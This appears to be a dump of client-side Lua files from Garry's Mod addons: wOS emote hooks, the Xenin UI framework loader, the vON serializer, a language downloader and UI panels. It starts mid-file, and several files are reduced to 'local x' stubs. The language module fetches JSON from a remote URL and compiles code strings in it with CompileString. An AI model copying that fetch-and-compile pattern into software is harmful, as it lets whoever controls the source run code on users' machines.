					tbl.Weight = 1
				end
			end
		elseif isstring( base ) then
			tbl.Sequence = base
		end
	end

	return tbl
	
end

HOLDTYPE.__index = HOLDTYPE

function wOS.AnimExtension.HoldTypeMeta:CreateMetaType( tbl )
	setmetatable( tbl, HOLDTYPE )
end
--PATH addons/_dance/lua/wos/fortnite/core/sh_core.lua:
--[[-------------------------------------------------------------------
	Fortnite Dancing Shared Core:
		All shared functions for good prediction between server/client
			Powered by
						  _ _ _    ___  ____  
				__      _(_) | |_ / _ \/ ___| 
				\ \ /\ / / | | __| | | \___ \ 
				 \ V  V /| | | |_| |_| |___) |
				  \_/\_/ |_|_|\__|\___/|____/ 
											  
 _____         _                 _             _           
|_   _|__  ___| |__  _ __   ___ | | ___   __ _(_) ___  ___ 
  | |/ _ \/ __| '_ \| '_ \ / _ \| |/ _ \ / _` | |/ _ \/ __|
  | |  __/ (__| | | | | | | (_) | | (_) | (_| | |  __/\__ \
  |_|\___|\___|_| |_|_| |_|\___/|_|\___/ \__, |_|\___||___/
                                         |___/             
----------------------------- Copyright 2019 ]]--[[
							  
	Lua Developer: King David
	Contact: www.wiltostech.com
]]--

wOS = wOS or {}
wOS.Fortnite = wOS.Fortnite or {}

hook.Add( "CalcMainActivity", "wOS.Fortnite.PerformEmote", function( ply )
	
	if ply:InVehicle() then return end
	if ply:GetNWBool( "wOS.Fortnite.EmoteEnabled", false ) then
		if not ply.WOS_FortniteLastBool then
			ply:SetCycle( 0 )
			ply.WOS_FortniteLastBool = true
		end
		local seq = ply:GetNWString( "wOS.Fortnite.Emote", "" )
		seq = ply:LookupSequence( seq )
		if not seq or seq < 1 then return end
		return -1, seq
	end
	ply.WOS_FortniteLastBool = ply.WOS_FortniteLastBool or ply:GetNWBool( "wOS.Fortnite.EmoteEnabled", false )
end )

hook.Add( "UpdateAnimation", "wOS.Fortnite.AnimationSpeed", function( ply, _, __ )

	if not ply:Alive() then return end
	if ply:InVehicle() then return end
	if !ply:GetNWBool( "wOS.Fortnite.EmoteEnabled", false ) then return end 
	ply:SetPlaybackRate( 1 )
	return true
	
end )
--PATH addons/_dance/lua/wos/fortnite/core/cl_wcpanel.lua:
--[[-------------------------------------------------------------------
	wiltOS Control Panel Addition:
		Allows people with the control panel to you know, configure things
			Powered by
						  _ _ _    ___  ____  
				__      _(_) | |_ / _ \/ ___| 
				\ \ /\ / / | | __| | | \___ \ 
				 \ V  V /| | | |_| |_| |___) |
				  \_/\_/ |_|_|\__|\___/|____/ 
											  
 _____         _                 _             _           
|_   _|__  ___| |__  _ __   ___ | | ___   __ _(_) ___  ___ 
  | |/ _ \/ __| '_ \| '_ \ / _ \| |/ _ \ / _` | |/ _ \/ __|
  | |  __/ (__| | | | | | | (_) | | (_) | (_| | |  __/\__ \
  |_|\___|\___|_| |_|_| |_|\___/|_|\___/ \__, |_|\___||___/
                                         |___/             
----------------------------- Copyright 2019 ]]--[[
							  
	Lua Developer: King David
	Contact: www.wiltostech.com
]]--

wOS = wOS or {}
wOS.Fortnite = wOS.Fortnite or {}

hook.Add( "wOS.CPanel.RequestAddons", "wOS.CPanel.AddBase", function( ADDONS )

	local data = {
		Name = "Last Stand",
		OnSelected = function( dat, PANEL )
			local pw, ph = PANEL:GetSize()
		
			local icon = vgui.Create( "DImage" )
			icon:SetImage( "scripted/breen_fakemonitor_1" )
			icon:SetSize( pw, ph*0.2 )
			PANEL:Add( icon )
			
			local lbl = vgui.Create( "DLabel" )
			lbl:SetWrap( true )
			lbl:SetFont( "GModNotify" )
			lbl:SetText( "Does this example get the point across?" )
			lbl:SetDark( true )	
			PANEL:Add( lbl )			
		end,
	}

	ADDONS:Add( data )
	
end )
--PATH addons/xenin_the_xenin_framework_1900562881/lua/autorun/xeninui_load.lua:
XeninUI = XeninUI || {}
XeninUI.ORM = XeninUI.ORM || {}
XeninUI.Players = XeninUI.Players || {}

function XeninUI:CreateFont(name, size, weight, mergeTbl)
	local tbl = {
		font = "Montserrat Medium",

		size = size + 2,
		weight = weight or 500,
		extended = true
	}

	if mergeTbl then
		table.Merge(tbl, mergeTbl)
	end

	surface.CreateFont(name, tbl)
end

function XeninUI:IncludeClient(path)
	if CLIENT then
		include("xeninui/" .. path .. ".lua")
	end

	if SERVER then
		AddCSLuaFile("xeninui/" .. path .. ".lua")
	end
end

function XeninUI:IncludeServer(path)
	if SERVER then
		include("xeninui/" .. path .. ".lua")
	end
end

function XeninUI:IncludeShared(path)
	XeninUI:IncludeServer(path)
	XeninUI:IncludeClient(path)
end

XeninUI:IncludeShared("settings/settings")
hook.Run("XeninUI.PostLoadSettings")
XeninUI:IncludeShared("libs/loader")

XeninUI.Loader():setName("Xenin Framework"):setAcronym("Xenin"):setDirectory("xeninui"):setColor(XeninUI.Theme.Red):load("libs", XENINUI_CLIENT, false, {
	ignoreFiles = {
	loader = true
	},
	overwriteRealm = {
		essentials_sh = XENINUI_SHARED,
		v0n_sh = XENINUI_SHARED,
		promises = XENINUI_SHARED,
		permissions = XENINUI_SHARED
	}
}):load("libs/network", XENINUI_SHARED):loadFile("server/orm/table_constraint", XENINUI_SERVER):load("server", XENINUI_SERVER, true):load("libs/languages", XENINUI_SHARED):load("libs/languages/network", {
	client = XENINUI_CLIENT,
	server = XENINUI_SERVER
}):load("libs/scripts", XENINUI_SHARED):load("libs/scripts/network", {
	client = XENINUI_CLIENT,
	server = XENINUI_SERVER
}):load("libs/configurator", XENINUI_SHARED):load("libs/configurator/classes", XENINUI_SHARED, false, {
overwriteRealm = {
database = XENINUI_SERVER
}
}):load("libs/configurator/network", {
	client = XENINUI_CLIENT,
	server = XENINUI_SERVER
}):load("libs/configurator/ui", XENINUI_CLIENT, true):load("libs/config", XENINUI_SHARED):load("libs/config/network", {
	client = XENINUI_CLIENT,
	server = XENINUI_SERVER
}):load("libs/players", XENINUI_SHARED, false, {
overwriteRealm = {
database = XENINUI_SERVER
}
}):load("libs/players/ui", XENINUI_CLIENT, true):load("libs/players/network", {
	shared = XENINUI_SHARED,
	client = XENINUI_CLIENT,
	server = XENINUI_SERVER
}):load("elements", XENINUI_CLIENT):load("core/ui", XENINUI_CLIENT):load("libs/units", XENINUI_SHARED, true):done()

XeninUI.Version = "2.1.0"

hook.Run("XeninUI.PreLoadAddons")
hook.Run("XeninUI.Loaded")
hook.Run("XeninUI.PostLoadAddons")

--PATH addons/xenin_the_xenin_framework_1900562881/lua/xeninui/libs/v0n_sh.lua:
local _deserialize, _serialize, _d_meta, _s_meta, d_findVariable, s_anyVariable
local sub, gsub, find, insert, concat, error, tonumber, tostring, type, next = string.sub, string.gsub, string.find, table.insert, table.concat, error, tonumber, tostring, type, next





function d_findVariable(s, i, len, lastType, jobstate)
	local i, c, typeRead, val = i or 1


	while true do

		if i > len then
			error("vON: Reached end of string, cannot form proper variable.")
		end


		c = sub(s, i, i)


		if typeRead then

			val, i = _deserialize[lastType](s, i, len, false, jobstate)

			return val, i, lastType


		elseif c == "@" then
			return nil, i, lastType


		elseif c == "$" then
			lastType = "table_reference"
			typeRead = true


		elseif c == "n" then
			lastType = "number"
			typeRead = true


		elseif c == "b" then
			lastType = "boolean"
			typeRead = true


		elseif c == "'" then
			lastType = "string"
			typeRead = true


		elseif c == "\"" then
			lastType = "oldstring"
			typeRead = true


		elseif c == "{" then
			lastType = "table"
			typeRead = true





		elseif c == "e" then
			lastType = "Entity"
			typeRead = true





		elseif c == "p" then
			lastType = "Entity"
			typeRead = true


		elseif c == "v" then
			lastType = "Vector"
			typeRead = true


		elseif c == "a" then
			lastType = "Angle"
			typeRead = true





		elseif lastType then
			val, i = _deserialize[lastType](s, i, len, false, jobstate)
			return val, i, lastType


		else
			error("vON: Malformed data... Can't find a proper type definition. Char#" .. i .. ":" .. c)
		end


		i = i + 1
	end
end



function s_anyVariable(data, lastType, isNumeric, isKey, isLast, jobstate)
	local tp = type(data)

	if jobstate[1] and jobstate[2][data] then
		tp = "table_reference"
	end


	if lastType ~= tp then

		lastType = tp

		if _serialize[lastType] then


			return _serialize[lastType](data, true, isNumeric, isKey, isLast, false, jobstate), lastType
		else
			error("vON: No serializer defined for type \"" .. lastType .. "\"!")
		end
	end


	return _serialize[lastType](data, false, isNumeric, isKey, isLast, false, jobstate), lastType
end





_deserialize = {


	["table"] = function(s, i, len, unnecessaryEnd, jobstate)
		local ret, numeric, i, c, lastType, val, ind, expectValue, key = {}, true, i or 1, nil, nil, nil, 1


		if sub(s, i, i) == "#" then
			local e = find(s, "#", i + 2, true)

			if e then
				local id = tonumber(sub(s, i + 1, e - 1))

				if id then
					if jobstate[1][id] and not jobstate[2] then
						error("vON: There already is a table of reference #" .. id .. "! Missing an option maybe?")
					end

					jobstate[1][id] = ret

					i = e + 1
				else
					error("vON: Malformed table! Reference ID starting at char #" .. i .. " doesn't contain a number!")
				end
			else
				error("vON: Malformed table! Cannot find end of reference ID start at char #" .. i .. "!")
			end
		end


		while true do

			if i > len then

				if unnecessaryEnd then
					return ret, i


				else
					error("vON: Reached end of string, incomplete table definition.")
				end
			end


			c = sub(s, i, i)



			if c == "}" then
				return ret, i


			elseif c == "~" then
				numeric = false

			elseif c == ";" then elseif numeric then

				val, i, lastType = d_findVariable(s, i, len, lastType, jobstate)

				ret[ind] = val

				ind = ind + 1


			else

				if expectValue then

					val, i, lastType = d_findVariable(s, i, len, lastType, jobstate)

					ret[key] = val

					expectValue, key = false, nil


				elseif c == ":" then

					expectValue = true


				elseif key then

					error("vON: Malformed table... Two keys declared successively? Char#" .. i .. ":" .. c)


				else

					key, i, lastType = d_findVariable(s, i, len, lastType, jobstate)
				end
			end

			i = i + 1
		end

		return nil, i
	end,


	["table_reference"] = function(s, i, len, unnecessaryEnd, jobstate)
		local i, a = i or 1


		a = find(s, "[;:}~]", i)

		if a then
			local n = tonumber(sub(s, i, a - 1))

			if n then
				return jobstate[1][n] or error("vON: Table reference does not point to a (yet) known table!"), a - 1
			else
				error("vON: Table reference definition does not contain a valid number!")
			end
		end



		error("vON: Number definition started... Found no end.")
	end,





	["number"] = function(s, i, len, unnecessaryEnd, jobstate)
		local i, a = i or 1


		a = find(s, "[;:}~]", i)

		if a then
			return tonumber(sub(s, i, a - 1)) or error("vON: Number definition does not contain a valid number!"), a - 1
		end



		error("vON: Number definition started... Found no end.")
	end,




	["boolean"] = function(s, i, len, unnecessaryEnd, jobstate)
		local c = sub(s, i, i)



		if c == "1" then
			return true, i


		elseif c == "0" then
			return false, i
		end


		error("vON: Invalid value on boolean type... Char#" .. i .. ": " .. c)
	end,



	["oldstring"] = function(s, i, len, unnecessaryEnd, jobstate)
		local res, i, a = "", i or 1


		while true do
			a = find(s, "\"", i, true)

			if a then
				if sub(s, a - 1, a - 1) == "\\" then
					res = res .. sub(s, i, a - 2) .. "\""
					i = a + 1
				else
					return res .. sub(s, i, a - 2), a
				end
			else
				error("vON: Old string definition started... Found no end.")
			end
		end
	end,


	["string"] = function(s, i, len, unnecessaryEnd, jobstate)
		local res, i, a = "", i or 1


		while true do
			a = find(s, "\"", i, true)

			if a then
				if sub(s, a - 1, a - 1) == "\\" then
					res = res .. sub(s, i, a - 2) .. "\""
					i = a + 1
				else
					return res .. sub(s, i, a - 1), a
				end
			else
				error("vON: String definition started... Found no end.")
			end
		end
	end
}



_serialize = {




	["table"] = function(data, mustInitiate, isNumeric, isKey, isLast, first, jobstate)


		local result, keyvals, len, keyvalsLen, keyvalsProgress, val, lastType, newIndent, indentString = {}, {}, #data, 0, 0




		for k, v in next, data do

			if type(k) ~= "number" or k < 1 or k > len or (k % 1 ~= 0) then
				keyvals[#keyvals + 1] = k
			end
		end

		keyvalsLen = #keyvals


		if not first then
			result[#result + 1] = "{"
		end

		if jobstate[1] and jobstate[1][data] then
			if jobstate[2][data] then
				error("vON: Table #" .. jobstate[1][data] .. " written twice..?")
			end

			result[#result + 1] = "#"
			result[#result + 1] = jobstate[1][data]
			result[#result + 1] = "#"

			jobstate[2][data] = true
		end


		if len > 0 then
			for i = 1, len do
				val, lastType = s_anyVariable(data[i], lastType, true, false, i == len and not first, jobstate)
				result[#result + 1] = val
			end
		end


		if keyvalsLen > 0 then

			result[#result + 1] = "~"


			for _i = 1, keyvalsLen do
				keyvalsProgress = keyvalsProgress + 1

				val, lastType = s_anyVariable(keyvals[_i], lastType, false, true, false, jobstate)

				result[#result + 1] = val .. ":"

				val, lastType = s_anyVariable(data[keyvals[_i]], lastType, false, false, keyvalsProgress == keyvalsLen and not first, jobstate)

				result[#result + 1] = val
			end
		end


		if not first then
			result[#result + 1] = "}"
		end

		return concat(result)
	end,


	["table_reference"] = function(data, mustInitiate, isNumeric, isKey, isLast, first, jobstate)
		data = jobstate[1][data]


		if mustInitiate then
			if isKey or isLast then
				return "$" .. data
			else
				return "$" .. data .. ";"
			end
		end

		if isKey or isLast then
			return data
		else
			return data .. ";"
		end
	end,




	["number"] = function(data, mustInitiate, isNumeric, isKey, isLast, first, jobstate)

		if mustInitiate then
			if isKey or isLast then
				return "n" .. data
			else
				return "n" .. data .. ";"
			end
		end

		if isKey or isLast then
			return data
		else
			return data .. ";"
		end
	end,



	["string"] = function(data, mustInitiate, isNumeric, isKey, isLast, first, jobstate)
		if sub(data, #data, #data) == "\\" then
			return "\"" .. gsub(data, "\"", "\\\"") .. "v\""
		end

		return "'" .. gsub(data, "\"", "\\\"") .. "\""
	end,



	["boolean"] = function(data, mustInitiate, isNumeric, isKey, isLast, first, jobstate)

		if mustInitiate then
			if data then
				return "b1"
			else
				return "b0"
			end
		end

		if data then
			return "1"
		else
			return "0"
		end
	end,



	["nil"] = function(data, mustInitiate, isNumeric, isKey, isLast, first, jobstate)
		return "@"
	end
}





if gmod then
	local Entity = Entity



	local extra_deserialize = {


		["Entity"] = function(s, i, len, unnecessaryEnd, jobstate)
			local i, a = i or 1


			a = find(s, "[;:}~]", i)

			if a then
				return Entity(tonumber(sub(s, i, a - 1))), a - 1
			end

			error("vON: Entity ID definition started... Found no end.")
		end,



		["Vector"] = function(s, i, len, unnecessaryEnd, jobstate)
			local i, a, x, y, z = i or 1


			a = find(s, ",", i)

			if a then
				x = tonumber(sub(s, i, a - 1))
				i = a + 1
			end

			a = find(s, ",", i)

			if a then
				y = tonumber(sub(s, i, a - 1))
				i = a + 1
			end

			a = find(s, "[;:}~]", i)

			if a then
				z = tonumber(sub(s, i, a - 1))
			end

			if x and y and z then
				return Vector(x, y, z), a - 1
			end

			error("vON: Vector definition started... Found no end.")
		end,



		["Angle"] = function(s, i, len, unnecessaryEnd, jobstate)
			local i, a, p, y, r = i or 1


			a = find(s, ",", i)

			if a then
				p = tonumber(sub(s, i, a - 1))
				i = a + 1
			end

			a = find(s, ",", i)

			if a then
				y = tonumber(sub(s, i, a - 1))
				i = a + 1
			end

			a = find(s, "[;:}~]", i)

			if a then
				r = tonumber(sub(s, i, a - 1))
			end

			if p and y and r then
				return Angle(p, y, r), a - 1
			end

			error("vON: Angle definition started... Found no end.")
		end
	}

	local extra_serialize = {

		["Entity"] = function(data, mustInitiate, isNumeric, isKey, isLast, first, jobstate)
			data = data:EntIndex()

			if mustInitiate then
				if isKey or isLast then
					return "e" .. data
				else
					return "e" .. data .. ";"
				end
			end

			if isKey or isLast then
				return data
			else
				return data .. ";"
			end
		end,



		["Vector"] = function(data, mustInitiate, isNumeric, isKey, isLast, first, jobstate)
			if mustInitiate then
				if isKey or isLast then
					return "v" .. data.x .. "," .. data.y .. "," .. data.z
				else
					return "v" .. data.x .. "," .. data.y .. "," .. data.z .. ";"
				end
			end

			if isKey or isLast then
				return data.x .. "," .. data.y .. "," .. data.z
			else
				return data.x .. "," .. data.y .. "," .. data.z .. ";"
			end
		end,



		["Angle"] = function(data, mustInitiate, isNumeric, isKey, isLast, first, jobstate)
			if mustInitiate then
				if isKey or isLast then
					return "a" .. data.p .. "," .. data.y .. "," .. data.r
				else
					return "a" .. data.p .. "," .. data.y .. "," .. data.r .. ";"
				end
			end

			if isKey or isLast then
				return data.p .. "," .. data.y .. "," .. data.r
			else
				return data.p .. "," .. data.y .. "," .. data.r .. ";"
			end
		end
	}

	for k, v in pairs(extra_serialize) do
		_serialize[k] = v
	end

	for k, v in pairs(extra_deserialize) do
		_deserialize[k] = v
	end

	local extraEntityTypes = {
		"Vehicle",
		"Weapon",
		"NPC",
		"Player",
		"NextBot"
	}

	for i = 1, #extraEntityTypes do
		_serialize[extraEntityTypes[i]] = _serialize.Entity
	end
end





local function checkTableForRecursion(tab, checked, assoc)
	local id = checked.ID

	if not checked[tab] and not assoc[tab] then
		assoc[tab] = id
		checked.ID = id + 1
	else
		checked[tab] = true
	end

	for k, v in pairs(tab) do
		if type(k) == "table" and not checked[k] then
			checkTableForRecursion(k, checked, assoc)
		end

		if type(v) == "table" and not checked[v] then
			checkTableForRecursion(v, checked, assoc)
		end
	end
end



local _s_table = _serialize.table
local _d_table = _deserialize.table

_d_meta = {
__call = function(self, str, allowIdRewriting)
	if type(str) == "string" then
		return _d_table(str, nil, #str, true, {
			{},
			allowIdRewriting
		})
	end

	error("vON: You must deserialize a string, not a " .. type(str))
end
}
_s_meta = {
__call = function(self, data, checkRecursion)
	if type(data) == "table" then
		if checkRecursion then
			local assoc, checked = {}, {
			ID = 1 }

			checkTableForRecursion(data, checked, assoc)

			return _s_table(data, nil, nil, nil, nil, true, {
				assoc,
				{}
			})
		end

		return _s_table(data, nil, nil, nil, nil, true, {
		false })
	end

	error("vON: You must serialize a table, not a " .. type(data))
end
}



von = {
	version = "1.3.4",
	versionNumber = 1003004,

	deserialize = setmetatable(_deserialize, _d_meta),
	serialize = setmetatable(_serialize, _s_meta)
}



return von

--PATH addons/xenin_the_xenin_framework_1900562881/lua/xeninui/libs/languages/core.lua:
XeninUI.HTTPReady = (function() local __laux_nilish_coalescing_var = XeninUI.HTTPReady if __laux_nilish_coalescing_var ~= nil then return __laux_nilish_coalescing_var else return false end end)()
XeninUI.LanguageAddons = {}

if (!file.IsDir("xenin/languages", "DATA")) then
	file.CreateDir("xenin/languages")
end

local LANG = {}
LANG.Languages = {}
LANG.Queue = {}

AccessorFunc(LANG, "m_url", "URL")
AccessorFunc(LANG, "m_folder", "Folder")
AccessorFunc(LANG, "m_branch", "Branch")

function LANG:SetActiveLanguage(lang)
	self.activeLang = lang

	self.Languages[lang] = self.Languages[lang] or {
		phrases = {},
		cachedPhrases = {}
	}
end

function LANG:GetActiveLanguage(lang)
	return self.activeLang end

function LANG:SetID(id)
	self.ID = id

	if (!file.IsDir("xenin/languages/" .. id, "DATA")) then
		file.CreateDir("xenin/languages/" .. id)
	end
end

function LANG:GetID()
	return self.ID
end

function LANG:GetQueue()
	return self.Queue
end

function LANG:AddToQueue(lang, overwrite, promise)
	table.insert(self.Queue, {
		lang = lang,
		overwrite = overwrite,
		promise = promise
	})
end

function LANG:EmptyQueue()
	self.Queue = {}
end

function LANG:ProcessQueue()
	for i, v in ipairs(self:GetQueue()) do
		self:Download(v.lang, v.overwrite, v.promise)
	end
end

function LANG:GetFilePath(lang)
	return "xenin/languages/" .. self:GetID() .. "/" .. lang .. ".json"
end

function LANG:Exists(lang)
	return file.Exists(self:GetFilePath(lang), "DATA")
end

function LANG:SetLocalLanguage(lang, tbl)
	local _tbl = {}
	_tbl.cachedPhrases = {}
	tbl = isstring(tbl) and self:ParseJSON(tbl) or tbl
	table.Merge(_tbl, tbl)

	self.Languages[lang] = _tbl
end

function LANG:ParseJSON(json)
	local tbl = util.JSONToTable(json)
	if (!tbl) then return end
	for i, v in pairs(tbl.functions or {}) do
		tbl.functions[i] = CompileString(v, i)
	end

	return tbl
end

function LANG:Download(lang, overwrite, p)
	if p == nil then p = XeninUI.Promises.new()
	end
	if (self:GetLanguage(lang) and !overwrite) then
		local tbl = self:GetLanguage(lang)
		if tbl then
			return p:resolve(tbl)
		else
			local tbl = file.Read(self:GetFilePath(lang), "DATA")
			if tbl then
				return p:resolve(self:ParseJSON(tbl))
			end
		end


	end

	if (!XeninUI.HTTPReady) then
		self:AddToQueue(lang, overwrite, p)

		return p
	end

	local branch = self:GetBranch() or "master"
	local url = self.ComputeURL and self:ComputeURL(lang) or self:GetURL() .. "/raw/" .. branch .. "/" .. self:GetFolder() .. "/" .. lang .. ".json"
	local function tryDownloadFromServer(err)
		if (CLIENT and !LocalPlayer()["__XeninLanguageRequest_" .. tostring(self:GetID()) .. "_" .. tostring(lang)]) then
			LocalPlayer()["__XeninLanguageRequest_" .. tostring(self:GetID()) .. "_" .. tostring(lang)] = true

			XeninUI.LanguagesNetwork:sendRequestLanguage(self:GetID(), lang)

			return p:reject(err or "Download failure, attempting to download from server>")
		end

		return p:reject(err or "Download failure, attempting to download from server>")
	end

	http.Fetch(url, function(body, size, headers, code)
		if (code != 200) then
			return tryDownloadFromServer()
		end
		if (size == 0) then
			return tryDownloadFromServer("GitLab is down??")
		end


		if (body:sub(1, 15) == "<!DOCTYPE html>") then
			return tryDownloadFromServer(lang .. " language not found")
		end
		local tbl = self:ParseJSON(body)
		if (!tbl) then
			return tryDownloadFromServer("Unable to decode JSON")
		end

		file.Write(self:GetFilePath(lang), body)

		local _tbl = {}
		_tbl.cachedPhrases = {}
		table.Merge(_tbl, tbl)

		self.Languages[lang] = _tbl

		p:resolve(tbl, body, headers)
	end, function(err)

		if (CLIENT and !LocalPlayer()["__XeninLanguageRequest_" .. tostring(self:GetID()) .. "_" .. tostring(lang)]) then
			LocalPlayer()["__XeninLanguageRequest_" .. tostring(self:GetID()) .. "_" .. tostring(lang)] = true

			XeninUI.LanguagesNetwork:sendRequestLanguage(self:GetID(), lang)

			return p:reject("Download failure, attempting to download from server>")
		end

		p:reject(err)
	end)

	return p
end

function LANG:GetLanguage(lang)
	return self.Languages[lang] or {
		phrases = {},
		cachedPhrases = {},
		functions = {}
	}
end

function LANG:GetCachedPhrase(lang, phrase)
	local tbl = self:GetLanguage(lang)
	local str

	if (!tbl.cachedPhrases[phrase]) then
		local split = string.Explode(".", phrase)
		local outputPhrase = tbl.phrases
		for i, v in ipairs(split) do
			if (!outputPhrase[v]) then
				outputPhrase = nil

				break
			end

			outputPhrase = outputPhrase[v]
		end

		str = outputPhrase
		tbl.cachedPhrases[phrase] = outputPhrase
	else
		str = tbl.cachedPhrases[phrase]
	end

	return str
end

function LANG:GetPhrase(phrase, replacement)
	local activeLang = self:GetActiveLanguage()
	local str = self:GetCachedPhrase(activeLang, phrase)
	if (!str and activeLang != "english") then
		str = self:GetCachedPhrase("english", phrase)

		if (!str) then str = phrase end
	end

	if (replacement and str) then
		for i, v in pairs(replacement) do
			str = str:Replace(":" .. i .. ":", v)
		end
	end

	return str
end

function XeninUI:Language(id)
	if self.LanguageAddons[id] then
		return self.LanguageAddons[id]
	end

	local tbl = table.Copy(LANG)
	tbl:SetID(id)

	self.LanguageAddons[id] = tbl

	return tbl
end

hook.Add("InitPostEntity", "XeninUI.Languages", function()

	timer.Simple(3, function()
		XeninUI.HTTPReady = true

		for i, v in pairs(XeninUI.LanguageAddons) do
			v:ProcessQueue()
		end
	end)
end)

--PATH addons/xenin_the_xenin_framework_1900562881/lua/xeninui/libs/configurator/ui/inputs/selectbox.lua:
local x

--PATH addons/xenin_the_xenin_framework_1900562881/lua/xeninui/libs/configurator/ui/inputs/textentry.lua:
local x

--PATH addons/xenin_the_xenin_framework_1900562881/lua/xeninui/libs/config/network/client.lua:
net.Receive("Xenin.RequestConfig", function(len, ply)
  local selector = net.ReadString()
  local len = net.ReadUInt(32)
  local tbl = von.deserialize(net.ReadData(len))

  XeninUI.Config:set(selector, tbl)
end)

--PATH addons/xenin_the_xenin_framework_1900562881/lua/xeninui/libs/players/ui/notifications/hud.lua:
local x

--PATH addons/xenin_the_xenin_framework_1900562881/lua/xeninui/elements/avatar.lua:
local PANEL = {}

AccessorFunc(PANEL, "vertices", "Vertices", FORCE_NUMBER)
AccessorFunc(PANEL, "rotation", "Rotation", FORCE_NUMBER)

function PANEL:Init()
  self.rotation = 0
  self.vertices = 4
  self.scaler = 1
  self.avatar = vgui.Create("AvatarImage", self)
  self.avatar:SetPaintedManually(true)
end

function PANEL:CalculatePoly(w, h)
  local poly = {}

  local x = w * 0.5
  local y = h * 0.5 * self.scaler
  local radius = h * 0.5

  table.insert(poly, {
    x = x,
    y = y
  })

  for i = 0, self.vertices do
    local a = math.rad((i / self.vertices) * -360) + self.rotation
    table.insert(poly, {
      x = x + math.sin(a) * radius,
      y = y + math.cos(a) * (radius * self.scaler)
    })
  end

  local a = math.rad(0)
  table.insert(poly, {
    x = x + math.sin(a) * radius,
    y = y + math.cos(a) * (radius * self.scaler)
  })
  self.data = poly
end

function PANEL:PerformLayout(w, actualH)
  local h = self:GetTall()
  if (self.scaler < 1) then
    h = h * self.scaler
  end

  self.avatar:SetPos(0, h - actualH)
  self.avatar:SetSize(self:GetWide(), actualH)
  self:CalculatePoly(self:GetWide(), self:GetTall())
end

function PANEL:SetPlayer(ply, size)
  self.avatar:SetPlayer(ply, size)
end

function PANEL:SetSteamID(sid64, size)
  self.avatar:SetSteamID(sid64, size)
end
function PANEL:DrawPoly(w, h)
  if (!self.data) then
    self:CalculatePoly(w, h)
  end

  surface.DrawPoly(self.data)
end

function PANEL:Paint(w, h)
  render.ClearStencil()
  render.SetStencilEnable(true)

  render.SetStencilWriteMask(1)
  render.SetStencilTestMask(1)

  render.SetStencilFailOperation(STENCILOPERATION_REPLACE)
  render.SetStencilPassOperation(STENCILOPERATION_ZERO)
  render.SetStencilZFailOperation(STENCILOPERATION_ZERO)
  render.SetStencilCompareFunction(STENCILCOMPARISONFUNCTION_NEVER)
  render.SetStencilReferenceValue(1)

  draw.NoTexture()
  surface.SetDrawColor(color_white)
  self:DrawPoly(w, h)

  render.SetStencilFailOperation(STENCILOPERATION_ZERO)
  render.SetStencilPassOperation(STENCILOPERATION_REPLACE)
  render.SetStencilZFailOperation(STENCILOPERATION_ZERO)
  render.SetStencilCompareFunction(STENCILCOMPARISONFUNCTION_EQUAL)
  render.SetStencilReferenceValue(1)

  self.avatar:PaintManual()

  render.SetStencilEnable(false)
  render.ClearStencil()
end
vgui.Register("XeninUI.Avatar", PANEL)

--PATH addons/xenin_the_xenin_framework_1900562881/lua/xeninui/elements/combobox.lua:
local x

--PATH addons/xenin_the_xenin_framework_1900562881/lua/xeninui/elements/sidebar_animated.lua:
local PANEL = {}

XeninUI:CreateFont("XeninUI.Sidebar.Name", 22)

AccessorFunc(PANEL, "m_body", "Body")

function PANEL:Init()
	self:SetZPos(20)

	self.Width = 88
	self._Alpha = 0

	self.Buttons = {}
	self.Panels = {}
end

function PANEL:AddTab(name, icon, panelClass)
	local button = self:Add("DButton")
	button:SetText("")
	button.Color = color_white
	button.Desc = name
	button.Paint = function(pnl, w, h)
		surface.SetDrawColor(pnl.Color)
		surface.SetMaterial(icon)
		surface.DrawTexturedRect(27, 17, 30, 30)

		draw.SimpleText(pnl.Desc, "XeninUI.Sidebar.Name", 27 + 30 + 16, h * 0.5, ColorAlpha(pnl.Color, self._Alpha), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
	end
	button.OnCursorEntered = function(pnl)
		self:OnCursorEntered()

		pnl:LerpColor("Color", XeninUI.Theme.Accent)
	end
	button.OnCursorExited = function(pnl)
		self:OnCursorExited()

		if (pnl.Id == self.Active) then return end

		pnl:LerpColor("Color", color_white)
	end
	button.DoClick = function(pnl)
		self:SetActive(pnl.Id)
	end

	local id = table.insert(self.Buttons, button)
	button.Id = id

	local pnl = self:GetBody():Add(panelClass or "DPanel")
	pnl:Dock(FILL)
	pnl:SetVisible(false)

	table.insert(self.Panels, pnl)
end

function PANEL:PerformLayout(w, h)
	local y = 0

	for i, v in pairs(self.Buttons) do
		v:SetSize(w, 68)
		v:SetPos(0, y)

		y = y + v:GetTall()
	end
end

function PANEL:Paint(w, h)
	draw.RoundedBoxEx(6, 0, 0, w, h, XeninUI.Theme.Navbar, false, false, true, false)
end

function PANEL:Think()
	if self._InvalidateParent then
		self:InvalidateParent()
	end
end

function PANEL:SetActive(id)
	if (self.Active == id) then return end

	if self.Active then
		local btn = self.Buttons[self.Active]
		local pnl = self.Panels[self.Active]
		if IsValid(btn) then
			btn:LerpColor("Color", color_white)
		end
		if IsValid(pnl) then
			pnl.DrawAlpha = pnl.DrawAlpha or 0
			pnl.PaintOver = function(pnl, w, h)
				draw.RoundedBoxEx(6, 0, 0, w, h, ColorAlpha(XeninUI.Theme.Background, pnl.DrawAlpha), false, false, true, true)
			end
			pnl:Lerp("DrawAlpha", 255, 0.15, function()
				pnl.PaintOver = nil
				pnl:SetVisible(false)
			end)
		end

		self.Active = id

		if self.OnActiveChanged then
			self:OnActiveChanged(id)
		end

		local btn = self.Buttons[id]
		local pnl = self.Panels[id]

		timer.Simple(0.15, function()
			if (!IsValid(self)) then return end

			btn:LerpColor("Color", XeninUI.Theme.Accent)
			pnl.DrawAlpha = pnl.DrawAlpha or 255
			pnl:SetVisible(true)
			if pnl.OnSwitchedTo then
				pnl:OnSwitchedTo(btn.Desc)
			end
			pnl.PaintOver = function(pnl, w, h)
				draw.RoundedBoxEx(6, 0, 0, w, h, ColorAlpha(XeninUI.Theme.Background, pnl.DrawAlpha), false, false, true, true)
			end
			pnl:Lerp("DrawAlpha", 0, 0.15, function()
				pnl.PaintOver = nil
			end)
		end)
	else

		self.Active = id

		local btn = self.Buttons[id]
		local pnl = self.Panels[id]

		btn.Color = XeninUI.Theme.Accent
		pnl:SetVisible(true)
		if pnl.OnSwitchedTo then
			pnl:OnSwitchedTo(btn.Desc)
		end
	end
end

function PANEL:OnCursorEntered()
	self._InvalidateParent = true

	local width = 0
	surface.SetFont("XeninUI.Sidebar.Name")
	for i, v in pairs(self.Buttons) do
